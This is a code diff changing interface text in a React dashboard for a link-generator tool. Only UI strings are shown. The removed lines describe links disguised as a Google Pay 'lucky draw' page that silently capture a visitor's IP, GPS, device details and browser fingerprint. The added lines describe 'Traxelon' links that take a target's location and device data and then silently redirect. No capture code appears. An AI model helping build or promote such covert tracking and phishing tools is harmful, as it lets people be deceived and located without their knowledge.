@@ -534,7 +534,7 @@ export default function Dashboard() {
           <div className="lg:col-span-1">
             <div className="bg-surface-elevated border border-surface-border rounded-2xl p-6">
               <h2 className="font-display text-xl tracking-wider mb-1">GENERATE <span className="text-primary">LINK</span></h2>
-              <p className="font-body text-xs text-text-muted mb-6">Creates a disguised GPay-looking link that captures device data</p>
+              <p className="font-body text-xs text-text-muted mb-6">Paste any URL — a Traxelon link is generated that captures device & location data before redirecting.</p>
 
               {error && (
                 <div className="flex items-start gap-2 bg-accent/10 border border-accent/30 text-accent rounded-lg px-3 py-2.5 font-body text-sm mb-4">
@@ -575,7 +575,7 @@ export default function Dashboard() {
               <div className="mt-4 p-3 bg-surface border border-surface-border rounded-lg">
                 <p className="font-body text-xs text-text-muted">
                   <span className="text-primary font-semibold">How it works: </span>
-                  The link appears as a Google Pay lucky draw page. When opened, it silently captures IP, GPS, device info and browser fingerprint.
+                   When the target opens the Traxelon link, the browser requests location permission, captures GPS + device info, then silently redirects to your pasted URL.
                 </p>
               </div>
             </div>
